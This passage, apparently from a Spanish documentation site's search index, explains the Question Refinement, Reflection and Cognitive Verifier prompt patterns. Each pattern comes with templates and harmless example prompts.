Python con FastAPI. El LLM proporciona entonces una pregunta revisada que es m\u00e1s espec\u00edfica para el lenguaje y el framework, tal como: \u201c\u00bfCu\u00e1les son las mejores pr\u00e1cticas para manejar la autenticaci\u00f3n de usuarios de forma segura en una aplicaci\u00f3n web de FastAPI para mitigar riesgos de seguridad comunes, como el cross-site scripting (XSS), cross-site request forgery (CSRF) y el secuestro de sesiones?\u201d.</p> <p>Es probable que el detalle adicional en la pregunta revisada no solo haga que el usuario sea consciente de los problemas que debe considerar, sino que conduzca a una mejor respuesta por parte del LLM. Para tareas de ingenier\u00eda de software, este patr\u00f3n tambi\u00e9n podr\u00eda incorporar informaci\u00f3n sobre posibles errores (bugs), modularidad u otras consideraciones de calidad del c\u00f3digo. Otro enfoque ser\u00eda refinar autom\u00e1ticamente las preguntas para que el c\u00f3digo generado separe limpiamente las responsabilidades (concerns) o minimice el uso de librer\u00edas externas, como por ejemplo:</p> <p>Siempre que haga una pregunta sobre c\u00f3mo escribir alg\u00fan c\u00f3digo, sugiere una mejor versi\u00f3n de mi pregunta que pida c\u00f3mo escribir el c\u00f3digo de una manera que minimice mis dependencias de librer\u00edas externas.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#5-consecuencias","title":"5. Consecuencias","text":"<p>El patr\u00f3n de Refinamiento de Pregunta ayuda a cerrar la brecha entre el conocimiento del usuario y la comprensi\u00f3n del LLM, produciendo as\u00ed interacciones m\u00e1s eficientes y precisas. Un riesgo de este patr\u00f3n es su tendencia a estrechar r\u00e1pidamente el interrogatorio por parte del usuario hacia un \u00e1rea espec\u00edfica que gu\u00eda al usuario por un camino de indagaci\u00f3n m\u00e1s limitado de lo necesario. La consecuencia de este estrechamiento es que el usuario puede perder informaci\u00f3n importante del \u201cpanorama general\u201d (bigger picture). Una soluci\u00f3n a este problema es proporcionar un alcance adicional al prompt del patr\u00f3n, como por ejemplo \u201cno limites mis preguntas a lenguajes de programaci\u00f3n o frameworks espec\u00edficos\u201d.</p> <p>Otro enfoque para superar el estrechamiento arbitrario o la focalizaci\u00f3n limitada de la pregunta refinada es combinar el patr\u00f3n de Refinamiento de Pregunta con otros patrones. En particular, este patr\u00f3n puede combinarse con el patr\u00f3n de Verificador Cognitivo para que el LLM produzca autom\u00e1ticamente una serie de preguntas de seguimiento que puedan generar la pregunta refinada. Por ejemplo, en el siguiente prompt se aplican los patrones de Refinamiento de Pregunta y Verificador Cognitivo para asegurar que se planteen mejores preguntas al LLM:</p> <p>\u201cDe ahora en adelante, cada vez que haga una pregunta, haz cuatro preguntas adicionales que te ayuden a producir una versi\u00f3n mejor de mi pregunta original. Luego, usa mis respuestas para sugerir una versi\u00f3n mejor de mi pregunta original\u201d.</p> <p>Al igual que con muchos patrones que permiten a un LLM generar nuevas preguntas utilizando su conocimiento, el LLM puede introducir t\u00e9rminos o conceptos desconocidos para el usuario en la pregunta. Una forma de abordar este problema es incluir una declaraci\u00f3n que indique que el LLM debe explicar cualquier t\u00e9rmino desconocido que introduzca en la pregunta. Una mejora adicional de esta idea es combinar el patr\u00f3n de Refinamiento de Pregunta con el patr\u00f3n Persona para que el LLM marque los t\u00e9rminos y genere definiciones que asuman un nivel particular de conocimiento, como en este ejemplo:</p> <p>\u201cDe ahora en adelante, cada vez que haga una pregunta, haz cuatro preguntas adicionales que te ayuden a producir una versi\u00f3n mejor de mi pregunta original. Luego, usa mis respuestas para sugerir una versi\u00f3n mejor de mi pregunta original. Despu\u00e9s de las preguntas de seguimiento, act\u00faa temporalmente como un usuario sin conocimientos de AWS y define cualquier t\u00e9rmino que necesite saber para responder con precisi\u00f3n a las preguntas\u201d.</p> <p>Un LLM siempre puede producir imprecisiones f\u00e1cticas, al igual que un humano. Un riesgo de este patr\u00f3n es que las imprecisiones se introduzcan en la pregunta refinada. Este riesgo puede mitigarse, sin embargo, combinando el patr\u00f3n de Lista de Verificaci\u00f3n de Hechos para permitir al usuario identificar posibles imprecisiones y el patr\u00f3n de Reflexi\u00f3n para explicar el razonamiento detr\u00e1s del refinamiento de la pregunta.</p>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[PREGUNTA]\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre>"},{"location":"Patron-de-Refinamiento-de-Pregunta/#7-ejemplos","title":"7. Ejemplos","text":"N\u00famero de Huesos<pre><code>\u00bfCu\u00e1ntos huesos tiene el cuerpo humano?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> N\u00famero de Paises<pre><code>\u00bfCu\u00e1ntos pa\u00edses hay en el mundo?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> La monta\u00f1a m\u00e1s alta<pre><code>\u00bfCu\u00e1l es la monta\u00f1a m\u00e1s alta?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> A qu\u00e9 temperatura<pre><code>\u00bfA qu\u00e9 temperatura hierve el agua?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre> Fruta o verdura<pre><code>\u00bfEl tomate es una fruta o una verdura?\n## PROTOCOLO DE REFINAMIENTO\nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Sugiere una mejor versi\u00f3n de mi pregunta.\n2. Explica brevemente POR QU\u00c9 tu versi\u00f3n es mejor.\n3. Cons\u00faltame si quiero usar la versi\u00f3n que tu proporcionas.\n</code></pre>"},{"location":"Patron-de-Reflexion/","title":"El Patr\u00f3n de Reflexi\u00f3n","text":""},{"location":"Patron-de-Reflexion/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>El objetivo de este patr\u00f3n es pedirle al modelo que explique autom\u00e1ticamente el razonamiento l\u00f3gico (rationale) detr\u00e1s de las respuestas dadas al usuario. El patr\u00f3n permite a los usuarios evaluar mejor la validez de la salida, adem\u00e1s de informarles sobre c\u00f3mo un LLM lleg\u00f3 a una respuesta particular. La reflexi\u00f3n puede aclarar cualquier punto de confusi\u00f3n, descubrir suposiciones subyacentes y revelar lagunas en el conocimiento o la comprensi\u00f3n.</p>"},{"location":"Patron-de-Reflexion/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>Los LLM pueden cometer errores y, de hecho, los cometen. Adem\u00e1s, es posible que los usuarios no entiendan por qu\u00e9 un LLM produce una salida determinada y c\u00f3mo adaptar su prompt para resolver un problema con dicha salida. Al pedirle al LLM que explique autom\u00e1ticamente el razonamiento detr\u00e1s de sus respuestas, los usuarios pueden obtener una mejor comprensi\u00f3n de c\u00f3mo el modelo procesa la entrada, qu\u00e9 suposiciones est\u00e1 haciendo y de qu\u00e9 datos se est\u00e1 nutriendo.</p> <p>En ocasiones, los LLM pueden proporcionar respuestas incompletas, incorrectas o ambiguas. La reflexi\u00f3n es una ayuda para abordar estas deficiencias y garantizar que la informaci\u00f3n proporcionada por el LLM sea lo m\u00e1s precisa posible. Un beneficio adicional del patr\u00f3n es que puede ayudar a los usuarios a depurar sus prompts y determinar por qu\u00e9 no est\u00e1n obteniendo resultados que cumplan con las expectativas. Este patr\u00f3n es particularmente efectivo para la exploraci\u00f3n de temas que pueden confundirse con otros o que pueden tener interpretaciones matizadas, y donde es importante conocer la interpretaci\u00f3n precisa que utiliz\u00f3 el LLM.</p>"},{"location":"Patron-de-Reflexion/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Siempre que generes una respuesta Explica el razonamiento y las suposiciones detr\u00e1s de tu respuesta (Opcional) ...para que yo pueda mejorar mi pregunta <p>La primera declaraci\u00f3n solicita que, despu\u00e9s de generar una respuesta, el LLM explique el razonamiento y las suposiciones detr\u00e1s de la misma. Esta declaraci\u00f3n ayuda al usuario a comprender c\u00f3mo lleg\u00f3 el LLM a la respuesta y puede ayudar a generar confianza en las respuestas del modelo. El prompt incluye la declaraci\u00f3n de que el prop\u00f3sito de la explicaci\u00f3n es que el usuario refine su pregunta. Esta declaraci\u00f3n adicional le da al LLM el contexto que necesita para adaptar mejor sus explicaciones al prop\u00f3sito espec\u00edfico de ayudar al usuario a producir preguntas de seguimiento.</p>"},{"location":"Patron-de-Reflexion/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>Este ejemplo adapta el prompt espec\u00edficamente al dominio de proporcionar respuestas relacionadas con c\u00f3digo:</p> <p>\u201cCuando proporciones una respuesta, por favor explica el razonamiento y las suposiciones detr\u00e1s de tu selecci\u00f3n de frameworks de software. Si es posible, utiliza ejemplos espec\u00edficos o evidencia con fragmentos de c\u00f3digo asociados para respaldar tu respuesta de por qu\u00e9 el framework es la mejor selecci\u00f3n para la tarea. Adem\u00e1s, aborda cualquier posible ambig\u00fcedad o limitaci\u00f3n en tu respuesta, a fin de proporcionar una respuesta m\u00e1s completa y precisa\u201d.</p> <p>El patr\u00f3n se personaliza a\u00fan m\u00e1s para instruir al LLM a que justifique su selecci\u00f3n de frameworks de software, pero no necesariamente otros aspectos de la respuesta. Adem\u00e1s, el usuario dicta que se deben utilizar ejemplos de c\u00f3digo para ayudar a explicar la motivaci\u00f3n de la selecci\u00f3n del framework de software espec\u00edfico.</p>"},{"location":"Patron-de-Reflexion/#5-consecuencias","title":"5. Consecuencias","text":"<p>Una consecuencia del patr\u00f3n de Reflexi\u00f3n es que puede no ser efectivo para usuarios que no comprenden el \u00e1rea tem\u00e1tica de la discusi\u00f3n. Por ejemplo, una pregunta altamente t\u00e9cnica realizada por un usuario no t\u00e9cnico puede dar lugar a un razonamiento complejo para la respuesta que el usuario no pueda asimilar. Al igual que con otros patrones de prompts, existe el riesgo de que la salida incluya errores o suposiciones inexactas incorporadas en la explicaci\u00f3n del razonamiento que el usuario podr\u00eda no ser capaz de detectar. Este patr\u00f3n puede combinarse con el patr\u00f3n de Lista de Verificaci\u00f3n de Hechos para ayudar a abordar este problema.</p>"},{"location":"Patron-de-Reflexion/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[TAREA / PREGUNTA]\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d REFLEXI\u00d3N INTERNA\". En ella debes detallar:\n1. El razonamiento paso a paso que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre>"},{"location":"Patron-de-Reflexion/#7-ejemplos","title":"7. Ejemplos","text":"Cubo de Rubik<pre><code>\u00bfCu\u00e1ntos movimientos m\u00ednimos se necesitan para resolver un cubo de Rubik 3\u00d73?\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d  Reflexi\u00f3n y Justificaci\u00f3n\". En ella debes detallar:\n1. El razonamiento que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre> La Trampa Cultural<pre><code>\u00bfCu\u00e1nto debo dejar de propina en un restaurante por un buen servicio?\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d  Reflexi\u00f3n y Justificaci\u00f3n\". En ella debes detallar:\n1. El razonamiento que seguiste.\n2. Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre> La Trampa \u00c9tica/Seguridad<pre><code>He perdido mis llaves. \u00bfC\u00f3mo puedo abrir la puerta de mi casa sin romperla?\n## INSTRUCCIONES DE REFLEXI\u00d3N\n**Una vez generada la respuesta**, a\u00f1ade un separador y una secci\u00f3n titulada \"\ud83d\udd0d  Reflexi\u00f3n y Justificaci\u00f3n\". En ella debes detallar:\n1.  El razonamiento que seguiste.\n2.  Las suposiciones que hiciste sobre mi contexto o intenciones.\n3. Cualquier limitaci\u00f3n o posible ambig\u00fcedad en tu respuesta.\n4. Soluciones consideradas pero descartadas.\n</code></pre>"},{"location":"Patron-de-Verificador-Cognitivo/","title":"El Patr\u00f3n de Verificador Cognitivo","text":""},{"location":"Patron-de-Verificador-Cognitivo/#1-proposito-y-contexto","title":"1. Prop\u00f3sito y Contexto","text":"<p>La literatura de investigaci\u00f3n ha documentado que los LLMs a menudo pueden razonar mejor si una pregunta se subdivide en preguntas adicionales cuyas respuestas se combinen en la respuesta global a la pregunta original [14]. El prop\u00f3sito de este patr\u00f3n es forzar al LLM a subdividir siempre las preguntas en preguntas adicionales que puedan utilizarse para proporcionar una mejor respuesta a la pregunta original.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#2-motivacion","title":"2. Motivaci\u00f3n","text":"<p>La motivaci\u00f3n del patr\u00f3n de Verificador Cognitivo es doble:</p> <ul> <li>Es posible que los humanos inicialmente formulen preguntas de un nivel demasiado alto para proporcionar una respuesta concreta sin un seguimiento adicional, ya sea debido al desconocimiento del dominio, pereza en la entrada del prompt o incertidumbre sobre cu\u00e1l deber\u00eda ser la redacci\u00f3n correcta de la pregunta.</li> <li>La investigaci\u00f3n ha demostrado que los LLMs a menudo pueden desempe\u00f1arse mejor cuando se utiliza una pregunta que se subdivide en preguntas individuales.</li> </ul>"},{"location":"Patron-de-Verificador-Cognitivo/#3-estructura-e-ideas-clave","title":"3. Estructura e Ideas Clave","text":"<p>Declaraciones contextuales fundamentales:</p> Declaraciones Contextuales Cuando se te haga una pregunta, sigue estas reglas Genera una serie de preguntas adicionales que ayuden a responder la pregunta con mayor precisi\u00f3n Combina las respuestas a las preguntas individuales para producir la respuesta final a la pregunta general <p>La primera declaraci\u00f3n consiste en generar una serie de preguntas adicionales que ayudar\u00edan a responder con mayor precisi\u00f3n la pregunta original. Este paso instruye al LLM a considerar el contexto de la pregunta e identificar cualquier informaci\u00f3n que pueda faltar o no estar clara. Al generar preguntas adicionales, el LLM puede ayudar a garantizar que la respuesta final sea lo m\u00e1s completa y precisa posible. Este paso tambi\u00e9n fomenta el pensamiento cr\u00edtico por parte del usuario y puede ayudar a descubrir nuevas perspectivas o enfoques que podr\u00edan no haber sido considerados inicialmente, lo que posteriormente conduce a mejores preguntas de seguimiento.</p> <p>La segunda declaraci\u00f3n consiste en combinar las respuestas a las preguntas individuales para producir la respuesta final a la pregunta general. Este paso est\u00e1 dise\u00f1ado para asegurar que toda la informaci\u00f3n recopilada de las preguntas individuales se incorpore en la respuesta final. Al combinar las respuestas, el LLM puede proporcionar una respuesta m\u00e1s completa y precisa a la pregunta original. Este paso tambi\u00e9n ayuda a asegurar que se tenga en cuenta toda la informaci\u00f3n relevante y que la respuesta final no se base en una sola respuesta.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#4-implementacion-de-ejemplo","title":"4. Implementaci\u00f3n de Ejemplo","text":"<p>\u201cCuando te haga una pregunta, genera tres preguntas adicionales que te ayuden a dar una respuesta m\u00e1s precisa. Cuando haya respondido a las tres preguntas, combina las respuestas para producir las respuestas finales a mi pregunta original\u201d.</p> <p>Esta instancia espec\u00edfica del patr\u00f3n de prompt a\u00f1ade un refinamiento al patr\u00f3n original al especificar un n\u00famero determinado de preguntas adicionales que el LLM debe generar en respuesta a una pregunta. En este caso, el prompt especifica que ChatGPT debe generar tres preguntas adicionales que ayudar\u00edan a dar una respuesta m\u00e1s precisa a la pregunta original. El n\u00famero espec\u00edfico puede basarse en la experiencia del usuario y en su disposici\u00f3n a proporcionar informaci\u00f3n de seguimiento. Un refinamiento para el prompt puede ser proporcionar un contexto sobre la cantidad de conocimiento que el LLM puede asumir que tiene el usuario en el dominio para guiar la creaci\u00f3n de las preguntas adicionales:</p> <p>\u201cCuando te haga una pregunta, genera tres preguntas adicionales que te ayuden a dar una respuesta m\u00e1s precisa. Asume que s\u00e9 poco sobre el tema que estamos discutiendo y, por favor, define cualquier t\u00e9rmino que no sea de conocimiento general. Cuando haya respondido a las tres preguntas, combina las respuestas para producir las respuestas finales a mi pregunta original\u201d.</p> <p>El refinamiento tambi\u00e9n especifica que el usuario puede no tener una comprensi\u00f3n s\u00f3lida del tema que se est\u00e1 discutiendo, lo que significa que el LLM debe definir cualquier t\u00e9rmino que no sea de conocimiento general. Esto ayuda a asegurar que las preguntas de seguimiento no solo sean relevantes y enfocadas, sino tambi\u00e9n accesibles para el usuario, quien puede no estar familiarizado con t\u00e9rminos t\u00e9cnicos o espec\u00edficos del dominio. Al proporcionar definiciones claras y concisas, el LLM puede ayudar a asegurar que las preguntas de seguimiento sean f\u00e1ciles de entender y que la respuesta final sea accesible para usuarios con variados niveles de conocimiento y experiencia.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#5-consecuencias","title":"5. Consecuencias","text":"<p>Este patr\u00f3n puede dictar el n\u00famero exacto de preguntas a generar o dejar esta decisi\u00f3n al LLM. Existen pros y contras al dictar el n\u00famero exacto. Una ventaja es que especificar un n\u00famero exacto de preguntas puede delimitar estrechamente (scope) la cantidad de informaci\u00f3n adicional que el usuario se ve obligado a proporcionar, de modo que est\u00e9 dentro de un rango que est\u00e9 dispuesto y sea capaz de aportar.</p> <p>Sin embargo, una desventaja es que, dadas N preguntas, puede haber una pregunta N + 1 invaluable que siempre quedar\u00e1 fuera del alcance. Alternativamente, se puede proporcionar al LLM un rango o permitirle hacer preguntas adicionales. Por supuesto, al omitir un l\u00edmite en el n\u00famero de preguntas, el LLM puede generar numerosas preguntas adicionales que abrumen al usuario.</p>"},{"location":"Patron-de-Verificador-Cognitivo/#6-plantilla","title":"6. Plantilla","text":"PLANTILLA<pre><code>[ TAREA / PREGUNTA ]\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera [N - Opcional] preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre>"},{"location":"Patron-de-Verificador-Cognitivo/#7-ejemplos","title":"7. Ejemplos","text":"La Excusa Perfecta<pre><code>Genera una excusa cre\u00edble para no ir a la fiesta de cumplea\u00f1os de mi jefe este s\u00e1bado.\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 4 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre> El P\u00e1nico del Aniversario<pre><code>Olvid\u00e9 que ma\u00f1ana mi esposa y yo estamos de aniversario. Dime qu\u00e9 comprar r\u00e1pido.\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 4 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre> Diplomacia Pasivo-Agresiva<pre><code>Escribe un correo para mi compa\u00f1ero de trabajo que se sigue robando mis yogures del refrigerador com\u00fan.\n## ESTRATEGIA DE VERIFICACI\u00d3N COGNITIVA \nNo generes la respuesta todav\u00eda, ni des ejemplos o borradores. En su lugar:\n1. Para que puedas responder con precisi\u00f3n, genera 4 preguntas adicionales que necesites que yo responda para aclarar el contexto. \n2. Una vez que yo responda, combina esa nueva informaci\u00f3n para producir la respuesta final y completa.\n</code></pre>"}]}